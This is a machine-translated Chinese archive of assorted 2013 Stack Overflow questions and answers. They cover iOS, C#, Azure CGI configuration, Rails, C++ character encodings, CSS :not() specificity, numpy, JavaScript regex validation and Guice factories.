@property (weak, nonatomic) IBOutlet UILabel *addressLabel;
- (IBAction)getCurrentLocation:(id)sender;

@end 
```

rajViewController.m

```
@interface rajViewController (){
    CLLocationManager *locationManager;
    CLGeocoder *geo;
    CLPlacemark *placemark;
}

@end

@implementation rajViewController
//@synthesize placemark;
@synthesize latitudeLabel;
@synthesize longitudeLabel;

.
.
-(void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations
{
    CLLocation *newPlace = [[CLLocation alloc]init];
    newPlace = [locations lastObject];
    NSLog(@"the latitude is : %f",newPlace.coordinate.latitude);
    if (newPlace!=nil){
        self.latitudeLabel.text = [NSString stringWithFormat:@"%f", newPlace.coordinate.latitude];
        self.longitudeLabel.text = [NSString stringWithFormat:@"%f",newPlace.coordinate.longitude];
    }

} 
```

任何帮助将非常感激。

谢谢和问候，拉吉。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:53:23.497

检查您的笔尖，看看您是否与名为 forLatitude 的插座有某种连接。不是核心位置问题，这是插座连接问题

# c# - 我们如何将字符串转换为日期时间并将其存储在 varchar 中

> ID：15879824
> 
> 赞同：-6
> 
> 时间：2013-04-08T13:04:07.360
> 
> 标签：c#, asp.net, mysql, asp.net-mvc

我`varchar[1000]`在mysql数据库中使用。我想将日期时间存储在该列中。然后我需要将其转换为并将其`datatime`存储在`varchar`. 我们可以转换并存储在`varchar`.

如有错误请见谅。任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:16:50.607

需要明确的是，您*没有*将`DateTime`值存储在`varchar`列中。您正在存储字符串值。这些字符串值可能包含数字字符或特定的字符序列，人们可能会将其解释为特定的东西（例如日期和/或时间），但它们仍然只是字符串。

所以，为了把一个值变成一个字符串，你从[方法`.ToString()`开始](http://msdn.microsoft.com/en-us/library/system.object.tostring.aspx)。对于原始类型（例如整数和日期时间值），这将返回该类型的字符串表示。对于复杂类型，它将返回类的名称，因此您需要在该类中覆盖它。

您可以使用[自定义字符串格式](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)进一步细化日期和时间值的字符串表示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:13:49.733

正如评论中的其他人所提到的，您真的应该在这里重新考虑您的方法。但是， a`varchar`需要一个字符串，而不是日期时间，因此只需保存`string`您的`datetime`值的表示，无需转换。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:15:45.710

做一个 varchar(10) 可能然后在你的 C# 代码中：

```
date.ToString("yyyy/MM/dd"); 
```

你可以像这样格式化你的日期。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T16:35:57.277

`varchar(1000)`没有意义。如果您将日期和时间存储为字符串，则不需要超过 15-20 个字符（可能更少，具体取决于日期格式）。

您应该使用`CAST`运算符将`datetime`​​值转换为字符串：

```
CAST(dt AS varchar) 
```

如果您需要生成组合来自多个字段的数据的输出，您可能希望使用一个视图来组合您想要放在一起的值，而不是在数据表中专门使用 1000 个字符的字段。（提示：使用该`concat()`函数连接多个字符串。）

# azure - 在 Windows Azure 上自定义 cgi 出现 404 错误

> ID：15879825
> 
> 赞同：2
> 
> 时间：2013-04-08T13:04:11.850
> 
> 标签：azure, web-config, cgi, iis-8

我们无法通过 Paybox System 配置自定义 cgi (modulev3.exe)

我们关注： [http ://social.msdn.microsoft.com/forums/fr-fr/windowsazuredevelopment/thread/29cdf931-4a86-4fa0-b2ae-c3081e8559c0](http://social.msdn.microsoft.com/forums/fr-fr/windowsazuredevelopment/thread/29cdf931-4a86-4fa0-b2ae-c3081e8559c0)

但这会导致 404 错误

服务定义.csdef：

```
<Startup>
 <Task commandLine="EnableIsapi.cmd" executionContext="elevated" taskType="simple" />
</Startup> 
```

启用Isapi.cmd：

```
%windir%\system32\inetsrv\appcmd.exe set config /section:isapiCgiRestriction /+"[path='%RoleRoot%\approot\cgi-bin\modulev3.exe',description='Paybox',allowed='True']" 
```

网络配置：

```
<system.webServer>
   <handlers accessPolicy="Read, Write, Script, Execute">
     <remove name="CGI-exe" />
      <add name="CGI-exe" path="*.exe" verb="*" modules="CgiModule" resourceType="File" requireAccess="Execute" allowPathInfo="true" />
    </handlers>
    <security>
      <requestFiltering>
          <fileExtensions>
            <add fileExtension=".exe" allowed="true" />
          </fileExtensions>
      </requestFiltering>
      <isapiCgiRestriction>
        <add allowed="true" path="%RoleRoot%\approot\cgi-bin\modulev3.exe" description="PAYBOXMODULE" />
      </isapiCgiRestriction>
    </security>
</system.webServer> 
```

# c# - 将信息从一个网页插入两个不同的表格

> ID：15879829
> 
> 赞同：0
> 
> 时间：2013-04-08T13:04:16.253
> 
> 标签：c#, asp.net, sql

我在 asp.net 中工作，我有一个带有文本框和提交按钮的用户页面。当用户在文本框中输入信息并按下按钮时，该信息将添加到 sql server 数据库用户表中。将信息添加到数据库后，用户被重定向到另一个页面（`Response. Redirect()`），要求用户从下拉菜单中选择信息并单击按钮。单击按钮后，我想将下拉列表中的信息添加到另一个表（WorkShop），但我还需要将用户页面上的文本框中的一些信息添加到 Work shop 表中。有谁能够帮助我？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:34:39.323

即使您使用 response.redirect，您也应该使用 Session State 来保存您的记录。我建议你看一下[Session State](http://msdn.microsoft.com/en-us/library/ms178581%28v=vs.100%29.aspx)。这是 Session 的示例代码。您可以使用会话状态从每个页面访问此值。但它仅在您使用用户会话时才有效！从页面传输数据的另一种方法是使用查询字符串。尝试查看[Querystring ASP.NET](http://www.dotnetperls.com/querystring)

```
Session["FirstName"] = FirstNameTextBox.Text;
Session["LastName"] = LastNameTextBox.Text; 
```

# ruby-on-rails - 视图中的条件？

> ID：15879833
> 
> 赞同：0
> 
> 时间：2013-04-08T13:04:34.833
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2, haml

这是我的布局的一部分：

```
.container
  .brand
   = render 'layouts/nav'
   .row
    - flash.each do |key, msg|
      = content_tag :p, msg, :class => "flash #{key}"
    = yield 
```

_nav 部分是一个很大的下拉列表。例如，当访问者在 /locale/umbria 页面上时，我想在下拉列表中显示 umbria 内容，而当访问者在 tuscany 页面上时，我想显示 tuscany 内容。

大型下拉内容的一部分是翻译的对象。

```
= t('navigation.nav.short_intro_umbria')
or
= t('navigation.nav.short_intro_tuscany') 
```

当访问者在 umbria 页面上时如何显示 short_intro_umbria 内容，当访问者在 tuscany 页面上时如何显示 short_intro_tuscany 内容？

我怎样才能做到这一点？我必须在视图层中使用条件吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:20:08.360

不，这不是翻译的工作方式。关键是观点没有改变。你应该有*一个*视图，它输出的东西根本不参考位置......

```
= t 'navigation.nav.short_intro' 
```

而不是您在`config/locale/*.yml`. 然后，您所做的就是换出语言环境文件。

# java - JFreeChart：服务器停止响应

> ID：15879835
> 
> 赞同：0
> 
> 时间：2013-04-08T13:04:45.580
> 
> 标签：java, jsp, netbeans, jfreechart

我正在 Netbeans 中开发一个 JSP 项目。在应用程序中，我正在使用 JFreeChart 生成一个图形，它工作正常。

问题是，在生成图表后，服务器停止响应，我需要重新启动它才能让事情再次正常运行。这可能是因为 JFreeChart 消耗了太多资源吗？

我使用的应用程序基于我从[RoseIndia 上的本教程中](http://www.roseindia.net/jsp/draw-statistical-chart-jsp.shtml)获得的代码。

有什么建议/建议吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:14:59.507

进行线程转储以检查它们是否存在死锁。

您还可以使用 JProfiler 或 Visual VM 来查看内存发生了什么。

# c++ - C++中ü的ASCII值

> ID：15879836
> 
> 赞同：0
> 
> 时间：2013-04-08T13:04:46.380
> 
> 标签：c++, windows, encoding, ascii

根据[该](http://www.theasciicode.com.ar/ascii-printable-characters/capital-letter-a-uppercase-ascii-code-65.html)站点， ü 的 ASCii 值为 129，但是当我运行 printf("%d",'ü') 代码时，输​​出为-4。这是什么原因？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T13:12:51.200

您获得 -4 的事实基本上是纯粹的机会，因为它取决于您的环境的语言环境设置和编译器的实现。

其他人已经指出，根据您的平台是否认为`char`已签名，将 char 值打印为整数可能会产生负数`0x80`和更高的值。

* * *

至于编码（请注意，下面的列表绝不是详尽的）：

`ü`没有 ASCII 值，因为 (US-) [ASCII](http://en.wikipedia.org/wiki/ASCII)仅定义最多 0x7f (127) 的字符。

[IBM Codepage 437](https://en.wikipedia.org/wiki/Code_page_437)和[850](https://en.wikipedia.org/wiki/Code_page_850) (DOS) 具有`ü`at `0x81`，即 -127 或 129，具体取决于签名。

[ISO-8859-1 到 -4、-9、-10 和 -13 到 -16](https://en.wikipedia.org/wiki/ISO/IEC_8859)以及 Windows 代码页[1250](https://en.wikipedia.org/wiki/Windows-1250)和[1252](https://en.wikipedia.org/wiki/Windows-1252)具有`ü`( `0xfc`-4 / 252)。其他 ISO-8859 编码`ü`在其字符集中没有 。

[UTF- 8——由于](http://www.utf8-chartable.de/)[各种](http://utf8everywhere.org/)[原因](http://www.joelonsoftware.com/articles/Unicode.html)，每个人都应该使用它而不是过去的那些 8 位编码——编码`ü`为两字节序列`0xc3 0xbc`。

我整理了一个并排的代码页供个人使用，如果您有兴趣，可以在[我的主页](http://www.rootdirectory.de/chrome/site/encoding.html)上找到它。

* * *

一旦您接受了这一点，请注意该标准定义了两种[字符集](http://en.wikipedia.org/wiki/C_%28programming_language%29#Character_set)，一种用于表示源代码，另一种用于表示可执行代码中的字符串。两者都不包含超出基本 AZ 范围的任何字符，两者实际上可能不同（想想交叉编译器），也没有定义其数字表示 - 即您实际上可能正在查看[EBCDIC](http://en.wikipedia.org/wiki/EBCDIC)，其中字符甚至没有用*连续*值编码（即，`assert( 'Z' - 'A' == 26 )`会失败）。

你觉得这很好笑吗？好吧，基本上你的机器甚至不需要提供像`@`ASCII 这样的字符，但它*不是*基本字符集的一部分。;-)

一般来说，一旦你在源代码中使用了非 ASCII 字符，你就会留下定义明确的行为，并且依赖于实现/环境。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:12:31.993

在您的系统上 char 是有符号类型。打印前应先转换为无符号类型。

```
printf("%d", (unsigned char)'ü'); 
```

这是否会打印您期望的 129 是另一回事，但它至少会在您的*执行字符集中*打印 ü 的编码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T13:07:12.713

%d 正在打印一个带符号的十进制数，对于一个字节，它将在 -128-127 的范围内打印）。您可能想要使用无符号 (%u) 来输出预期的 0-255。

# php - Magento 删除数据库

> ID：15879838
> 
> 赞同：1
> 
> 时间：2013-04-08T13:04:49.660
> 
> 标签：php, mysql, database, magento

我有两个站点在同一个数据库中运行。一个是magento，一个不是。

我的问题是：哪些文件来自 magento，因为我没有使用前缀并且我不想从其他站点删除表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:56:08.667

在这里（[http://pastebin.com/mzEwpCZW](http://pastebin.com/mzEwpCZW)），您可以找到我们的安装之一（1.7.0.2）的表格列表。请记住，尽管我们的安装可能会导致 b

否则只需安装干净的 magento 并列出一个列表。

# ios - AQGridView (UIScrollView) 单元格在滚动时消失并重新出现

> ID：15879840
> 
> 赞同：2
> 
> 时间：2013-04-08T13:04:51.473
> 
> 标签：ios, objective-c, aqgridview

滚动时非常明显的尴尬闪烁`AQGridView`。

我查看了此链接 =>[调用 reloadData 会导致所有单元格闪烁](https://github.com/AlanQuatermain/AQGridView/issues/110)。

我在**第一次**`reloadData`加载单元格时打电话，但我的猜测是当单元格被重用时，这是在内部发生的。

 **关于实现方法的任何线索？会`lazy loading`在这里帮忙吗？

**编辑：**

哦，当我滚动时会发生这种情况，这可能是原因

`Visible cell list is missing some items! Got 6 missing indices`，有什么线索吗？

这是我在 github 上的问题 => [https://github.com/AlanQuatermain/AQGridView/issues/194](https://github.com/AlanQuatermain/AQGridView/issues/194)**

# c++ - C++ 11 不可复制类

> ID：15879841
> 
> 赞同：5
> 
> 时间：2013-04-08T13:04:54.267
> 
> 标签：c++, c++11

有没有类似C++ 11 引入的[http://www.boost.org/doc/libs/1_53_0/boost/noncopyable.hpp的类？](http://www.boost.org/doc/libs/1_53_0/boost/noncopyable.hpp)我不能使用`= delete`功能，因为我的编译器不支持它。如果可能的话，我宁愿使用标准库功能，而不是提升或实现我自己的功能。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-08T13:06:51.233

不，没有类似的标准等级。为此目的引入了 C++11 `= delete`，因此额外引入一个类将是不必要的冗余和无用的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-02T20:46:41.427

我不认为不可复制是没用的。'= delete' 需要使用两次（复制 ctor 和赋值运算符），这将是太多的输入。如果您的代码已经依赖于 boost - 首选使用 boost::noncopyable。

# mathcad - Mathcad While 循环

> ID：15879842
> 
> 赞同：3
> 
> 时间：2013-04-08T13:04:54.930
> 
> 标签：mathcad

任何人都可以指导我关于 Mathcad 15 中的 while 循环。我尝试了很多教程，但没有用。我的while循环很简单，代码写在下面。

```
k:=0
x:=8
while k< x
      k <- k+1

k=0    // printing k after while loop, no results were obtained. 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-05-28T15:21:08.557

这应该这样做。

![Mathcad While 循环帮助](https://i.stack.imgur.com/9uOJh.png)

您将需要使用 Programming 菜单选项，只需添加所需的行数并包含 While 构造。希望这可以帮助。

# css - 计算 :not() 伪类的 CSS 选择器特异性

> ID：15879843
> 
> 赞同：0
> 
> 时间：2013-04-08T13:04:57.460
> 
> 标签：css, css-selectors, pseudo-class, css-specificity

我已经知道如何计算 CSS 的选择器特异性（规范中提到的 a/b/c/d）。`:not()`但是，我无法确定如何为伪类计算它。请参见以下示例：

```
input:not([type="text"],[type="password"],.someClass) {...}
input:not(#someId[type="text"]) {...} 
```

假设它们都适用于一个元素，这两个是否应该计算为（0011），因此它们应该按照出现的顺序排列？或者是否应该`:not()`进一步单独计算伪类中的选择器，取决于哪个匹配，作为第二步来确定一个优先于另一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-26T03:03:21.380

> 假设它们都适用于一个元素，这两个是否应该计算为（0011），因此它们应该按照出现的顺序排列？还是应该`:not()`根据哪个匹配作为第二步来进一步单独计算伪类中的选择器，以确定优先于另一个的选择器？

如果您正在实施[Selectors 3](http://www.w3.org/TR/css3-selectors/#negation)，*则根本不应该计算它们*。如前所述，根据该规范，您的两个选择器都是无效的，因为它只定义`:not()`一次接受一个简单的选择器。

如果您将它们展开以便它们验证（按照[此处](https://stackoverflow.com/questions/10711730/whats-the-difference-in-the-not-selector-between-jquery-and-css/10711731#10711731)给出的说明/示例），那么它们的特异性将按如下方式计算：

```
/* 2 attributes, 1 class, 1 type -> specificity = 0-3-1 */
input:not([type="text"]):not([type="password"]):not(.someClass)

/* 
 * 1 ID, 1 type        -> specificity = 1-0-1
 * 1 attribute, 1 type -> specificity = 0-1-1
 */
input:not(#someId), input:not([type="text"]) 
```

因为[选择器 3 说](http://www.w3.org/TR/css3-selectors/#specificity)：

> 否定伪类中的选择器与其他选择器一样计算，但否定本身不计为伪类。

另外，针对您的评论：

> 诚然，根据规范，只有简单的选择器。但是有些浏览器支持多个浏览器。有些没有，有些后来放弃了。此外，即使使用像这样的简单选择器，您也可以编写相同的规则：`input:not([type="text"]):not([type="password"]):not(.someClass)`这更好并且也可以工作。这是否意味着它应该被计算为0031，那么呢？那些支持多个的呢，他们如何计算？

我所知道的唯一支持多个选择器的*浏览*`:not()`器是 Firefox 3.0，它之所以这样做是因为一个错误。Selectors 3*不允许*包含多个选择`:not()`器——仅在[Selectors 4](http://www.w3.org/TR/selectors4/#negation)中引入，其特异性计算甚至还没有明确定义¹，所以即使你试图实现 Selectors 4 （我*严重*怀疑你是），你会被卡住的。

~~我不清楚 Firefox 3.0 是如何通过其`:not()`选择器版本实现特异性的，我也没有它的副本可供测试，但我认为可以安全地假设它不再重要，因为它从来都不是预期的反正行为。~~好的，所以我选择了 Firefox 3.0 beta 1、3.0.0、3.0.18 和 3.1 beta 1，但它们都没有重现这种行为。所以你有它。

* * *

¹ [请注意，当前的 2013 ED 和 2011 FPWD 一致认为 的特异性`:not()`与其最具体的论点相同，但这可能会在未来发生变化。]

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-26T09:50:55.457

# 逻辑意图

下面是问题中最初发布的 CSS 选择器的细分。这是试图总结如何使用有效的 CSS 来表达这两个 CSS 规则（由@thgaskell 和@BoltClock 发起的讨论）。我将把具体问题留给其他海报。

## 第一条规则

```
input:not([type="text"],[type="password"],.someClass) {} 
```

*这是 CSS3 中的非验证选择器，目前可能不被任何已知浏览器支持。*

选择器的逻辑意图是`!(a or b or c)`，相当于`!a and !b and !c`. 对于 CSS 选择器，逻辑`and`操作需要链接，可以表示为`:not(a):not(b):not(c)`.

因此，第一条规则可以用有效的 CSS 表示如下：

```
input:not([type="text"]):not([type="password"]):not(.someClass) {} 
```

## 第二条规则

```
input:not(#someId[type="text"]) {} 
```

*这是 CSS3 中的非验证选择器，目前可能不被任何已知浏览器支持。*

选择器的逻辑意图是`!(a and b)`，相当于`!a or !b`. 对于 CSS 选择器，逻辑`or`操作需要使用多个选择器（每个操作数一个选择器），可以表示为`:not(a), :not(b)`.

因此，第二条规则可以用有效的 CSS 表示如下：

```
input:not(#someId), input:not([type="text"]) {} 
```

## 概括

逻辑`and`运算需要链接每个操作数。

```
.a.b {}                /* Matches elements with both classes  */
                       /*     (a and b)                       */

:not(.a):not(.b) {}    /* Matches elements with neither class */
                       /*     (!a and !b) == !(a or b)        */ 
```

逻辑`or`操作需要使用多个选择器（每个操作数一个选择器）。

```
.a, .b {}              /* Matches elements with either class              */
                       /*     (a or b)                                    */

:not(.a), :not(.b) {}  /* Matches elements that don't have both classes   */
                       /* (elements with none or only one of the classes) */
                       /* (aka: not both, nand, alternative denial        */
                       /*     (!a or !b) == !(a and b)                    */ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T01:30:08.730

规范（[W3C Selectors Level 3](http://www.w3.org/TR/css3-selectors/#specificity)）非常清楚地表明伪类与类相同。

一些在主要浏览器中玩弄 jsfiddle 表明**您是正确的**（在您的评论中），并且

```
 input:not([type="text"]):not([type="password"]):not(.someClass) {border:3px solid red} 
```

...将是 0.0.3.1。稍后在样式声明中需要 3 个类名来否决上述选择器。

鉴于：

```
<input value="X" class="Y Z" id="myId"/> 
```

您不能仅使用以下方法覆盖上述选择器：

```
input.Y.Z{border:3px solid pink;} 
```

见[http://jsfiddle.net/mhfaust/SxavM/1/](http://jsfiddle.net/mhfaust/SxavM/1/)

**更新**BoltClock 是对的。规范指出“否定伪类中的选择器与其他任何类型的选择器一样计算，但否定本身不计为伪类。” 因此，在本例中，由于其中的每个选择器`:not()` 都是类名或伪类，因此特异性保持为 0.0.3.1

# python - 高级索引中的 numpy 选择范围

> ID：15879845
> 
> 赞同：1
> 
> 时间：2013-04-08T13:05:01.400
> 
> 标签：python, numpy

我有两个用作索引的数组

```
a = np.array([0, 5, 11])
b = np.array([2, 8, 13]) 
```

如何选择这些数组之间的范围？即 0 - 2, 5 - 8, 11 - 13

```
c = np.array([0,1,2,5,6,7,8,11,12,13]) 
```

这样我就可以使用

```
data[c] # selects all the elements between ranges a and b 
```

如何构造数组`c`？我正在寻找一个 numpy 解决方案

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T13:09:32.073

```
>>> x = np.arange(20)
>>> a = [0, 5, 11]
>>> b = [2, 8, 13]
>>> np.hstack(x[start:stop+1] for start, stop in zip(a, b))
array([ 0,  1,  2,  5,  6,  7,  8, 11, 12, 13]) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-08T13:07:32.760

```
>>> zip(a, b)
[(0, 2), (5, 8), (11, 13)]

>>> [range(l,h+1) for l,h in zip(a, b)]
[[0, 1, 2], [5, 6, 7, 8], [11, 12, 13]]

>>> list(itertools.chain.from_iterable(range(l,h+1) for l,h in zip(a, b)))
[0, 1, 2, 5, 6, 7, 8, 11, 12, 13] 
```

# html - 将 wordpress 博客导入 joomla

> ID：15879846
> 
> 赞同：1
> 
> 时间：2013-04-08T13:05:01.657
> 
> 标签：html, wordpress, blogs, joomla3.0, posterous

如何将我的 wordpress 博客导入到我的新 joomla3.0 网站。有什么选项可以直接将后备备份插入 joomla3.0 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-31T05:27:33.317

**WordPress 核心 Joomla**

有几种工具（一个免费）可以帮助将 WordPress 迁移到核心 Joomla。

CMigrator：[http ://extensions.joomla.org/extensions/migration-a-conversion/data-import-a-export/19583](http://extensions.joomla.org/extensions/migration-a-conversion/data-import-a-export/19583)

J2XML Wordpress 导入器（**免费**）：[http ://extensions.joomla.org/extensions/extension-specific/extensions-specific-non-sorted/25375](http://extensions.joomla.org/extensions/extension-specific/extensions-specific-non-sorted/25375)

JConverter：[http ://extensions.joomla.org/extensions/migration-a-conversion/data-import-a-export/10237](http://extensions.joomla.org/extensions/migration-a-conversion/data-import-a-export/10237)

CMS2CMS：[http ://www.cms2cms.com/supported-cms/wordpress-to-joomla-migration/](http://www.cms2cms.com/supported-cms/wordpress-to-joomla-migration/)

J2XML 免费选项仅迁移类别和帖子。付费工具支持不同程度的页面、用户、图片和评论迁移。

**WordPress 到 Joomla 第三方博客扩展**

还有其他选项可以从 WordPress 导入 Joomla 博客扩展，例如：

WordPress 到 JoomBlog 转换器：[http ://extensions.joomla.org/extensions/migration-a-conversion/data-import-a-export/21946](http://extensions.joomla.org/extensions/migration-a-conversion/data-import-a-export/21946)

EasyBlog 显然可以迁移 WordPress 博客：[http ://extensions.joomla.org/extensions/authoring-a-content/blog/12630](http://extensions.joomla.org/extensions/authoring-a-content/blog/12630)

回复博客！显然可以导入 WordPress 博客：[http ://extensions.joomla.org/extensions/authoring-a-content/blog/14679](http://extensions.joomla.org/extensions/authoring-a-content/blog/14679)

**Joomla的后裔**

我不知道有任何工具可以将Posterous 数据直接导入Joomla，但似乎有一些工具可以将Posterous 数据导入WordPress，例如：

[http://en.support.wordpress.com/import/import-from-posterous/](http://en.support.wordpress.com/import/import-from-posterous/)

[https://wordpress.org/plugins/posterous-importer/](https://wordpress.org/plugins/posterous-importer/)

[http://lifehacker.com/5892776/how-to-back-up-and-migrate-your-posterous-spaces-to-tumblr-blogger-or-wordpress](http://lifehacker.com/5892776/how-to-back-up-and-migrate-your-posterous-spaces-to-tumblr-blogger-or-wordpress)

看起来最好的做法是在将您的 WordPress 网站迁移到 Joomla 之前将您的 Posterous 数据导入 WordPress。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:31:04.280

有一个 joomla 插件可以做到这一点，但你必须付费：

[https://compojoom.com/joomla-extensions/cmigrator](https://compojoom.com/joomla-extensions/cmigrator)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-10T10:38:10.177

后备备份 - 听起来很有趣，但我认为 joomla 论坛在您的情况下会提供更多信息。他们经常讨论您的问题，并且似乎有几种方法可以为您迁移。

以这个线程为例： http: [//forum.joomla.org/viewtopic.php?f=706 &t=796382](http://forum.joomla.org/viewtopic.php?f=706&t=796382)

祝你好运，兄弟！

# php - 用php存储url参数

> ID：15879847
> 
> 赞同：0
> 
> 时间：2013-04-08T13:05:03.037
> 
> 标签：php, url, dom, parameters, domdocument

我需要使用 php 存储按钮的 url 参数（使用 DOMdocument？！）我网站上的按钮有一个包含参数的链接 url

```
http://example.com/register/register-company.html?tx_powermail_pi1[regUid]=78 
```

方法是存储 id 78（来自 [regUid]=78），但 id 是动态的，可以是 33、23 或其他数字。有没有没有 jQuery 和 Javascript 的解决方案？

谢谢任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:07:37.403

尝试这个：

```
$link = "<a href='http://example.com/register/register-company.html?tx_powermail_pi1[regUid]=78'>Link</a>" ;
$dom = new DOMDocument;
$dom->loadHTML($link);
foreach ($dom->getElementsByTagName('a') as $node){
    $url = $node->getAttribute("href");
    $parts = parse_url($url) ;
    $query = $parts['query'];
    parse_str($query, $vars) ;
    echo $vars['tx_powermail_pi1']['regUid'] ;
} 
```

# html - P 元素不能用作“div”元素？

> ID：15879851
> 
> 赞同：-5
> 
> 时间：2013-04-08T13:05:12.833
> 
> 标签：html, css

### HTML

```
<div class="contents">
    <p class="alignCenter"><!-- do not align to center-->
        <img src="http://i50.tinypic.com/1zey0j8.gif" />
    </p>
</div> 
```

### CSS

```
.contents p{text-align: justify;}
.alignCenter{text-align: center;} 
```

当我从 更改`<p>`为`<div>`时，它应该可以正常工作，但是为什么`<p>`在使图像居中时元素不可以呢？

看到**[这个小提琴](http://jsfiddle.net/Y7PhV/126/)**。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T13:09:27.377

`<p>`确实是块级。你的问题是你的[CSS](http://en.wikipedia.org/wiki/Cascading_Style_Sheets)。标签周围的`<p>`s 在. 在所有其他条件相同的情况下，基于 id 的 CSS 优于基于类的 CSS。`<img>``<div id='content'>`

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-09T01:21:58.697

添加`!important`到您的班级以强制您的选择器工作。那是，

```
.alignCenter{text-align: center !important;} 
```

看到**[这个小提琴](http://jsfiddle.net/zaWuM/2/)**。

请参阅 Stack Overflow 问题*[<p> 和 <div> 有什么区别？](https://stackoverflow.com/questions/2226562)*`p`查看和之间的区别`div`。

# joomla - Joomla：隐藏第三个导航而不从菜单中禁用

> ID：15879854
> 
> 赞同：0
> 
> 时间：2013-04-08T13:05:25.937
> 
> 标签：joomla, joomla1.5

我有一个使用 Joomla 1.5.9 版开发的网站。我想隐藏第三级及更高级别的下拉菜单，而不从管理区域停用已**发布**按钮。实际上，我正在使用 Xmap 插件。如果我从菜单部分停用，那么它也不会显示在站点地图中。

例如，

[http://jupiterpumpandwell.vidushiinfotech.info/services/water-treatment-services/iron-removal-systems.html](http://jupiterpumpandwell.vidushiinfotech.info/services/water-treatment-services/iron-removal-systems.html)

我不想在主导航中显示上面的页面。但是，我想在站点地图中显示。

使用这个有什么功能吗，我们只能从主导航中隐藏第三级菜单，而不是从站点地图中隐藏。

如果有什么可用的，请告诉我。

**谢谢**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T14:02:28.247

登录到后端并转到模块管理器。打开菜单的模块，右侧有选项`End Level`。选择要停止菜单渲染的级别。在您的情况下，它将是 2

# javascript - 如何使用javascript编写仅允许两位数后的代码？

> ID：15879855
> 
> 赞同：0
> 
> 时间：2013-04-08T13:05:30.753
> 
> 标签：javascript, regex, dom

我只需要在点后输入两位数。例如 23.34 1.22 .23

这是示例代码

```
<input type="text" id="amount" onkeypress="return isNumberKey(this);"> 

function isNumberKey(evt) 
{ 
    var charCode = (evt.which) ? evt.which : event.keyCode; 
    return (charCode<=31 ||  charCode==46 || (charCode>=48 && charCode<=57)); 
} 

function validCurrency(amt) 
{ 
    return amt.match(/^\d*(.\d{0,2})?$/); 
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:08:40.657

您可以尝试以下正则表达式：

```
/^\d*(?:\.\d{0,2})?$/ 
```

您犯的主要错误是没有用反斜杠转义点。点将接受任何字符。用反斜杠转义的点会寻找一个点，而不是任何字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:07:20.650

你可以使用这样的正则表达式：

```
/.*\.\d\d$/ 
```

它将匹配：

```
anything                .*
followed by a dot       \.
followed by two digits  \d\d
anchored to the end     $ 
```

这是您的功能：

```
function validCurrency(amt) 
{ 
    return amt.match(//.*\.\d\d/$/); 
} 
```

# java - 使用 Guice 在对象图中构建特定类

> ID：15879858
> 
> 赞同：0
> 
> 时间：2013-04-08T13:05:37.457
> 
> 标签：java, generics, guice, subtype, assisted-inject

我陷入了一种情况，即我很早就决定不使用 Guice 创建特定的图表。我需要一个工厂，但我不知道如何建造它。

我所取得的是一个会话感知游戏对象管理系统。

所有需要参与这项工作的对象都可以正常工作。

它们都是通过注入、提供者、guice 工厂等创建的。

在这个级别我真正需要能够管理的一个对象是项目。

Items 也是我没有创建 guice 的一个对象。

项目也有一个复杂的类层次结构，客户预先知道，但平台代码不知道。在我最初的设计中，我建立了自己的工厂，以便能够使用我的 guicified 组件来正确构建这些对象。

到目前为止这工作正常，因为这些对象必须参与管理层，我需要找到一个简单的解决方案。

这是当前的实现：

```
abstract class Item{
  public Item(ItemID item){
    ...
  }
  ...
}

class MyItem extends Item{
   ...
}

class MyOtherItem extends MyItem{
   ...
}

class MyFavoriteItem extends Item{
   ...
} 
```

我当前的非 guice 实现看起来有点像这样

```
class ItemFactory{
   //this sequence generator is plugged into my persistance layer. Allows for generating
   //restful api calls for a specific item.
   @Inject
   private SequenceGenerator sequenceGenerator;

   public ItemID getNextItemID(){
     return sequenceGenerator.generateNextItemID();
   }

   //NOTE: these created objects do not participate in AOP
   //since they are not created by guice
   public <I extends Item> I createItem(Class<I> type){
     Item myItem = type.getConstructor(ItemID.class).newInstance(getNextItemID());
     return (I)myItem;
   }
} 
```

我完全不知道这些子类型，通常由客户端模块提供。我有一些注释，使用任何 guice 创建的对象，我可以在我正在开发的游戏框架中提供托管状态。

它适用于除 item 之外的所有对象......因为它们不是 guice 创建的对象。

我更喜欢这样的东西：

```
class MyItem extends Item{
  @Inject
  public MyItem(@Assisted ItemID itemID);
}

interface MyGuiceFactory{
  public <I extends Item> I createItem(Class<I> type, ItemID itemID);
}

class MyGuiceModule extends AbstractModule{
  public void configure(){
    install(new FactoryModuleBuilder().build(MyGuiceFactory.class));
  }
}

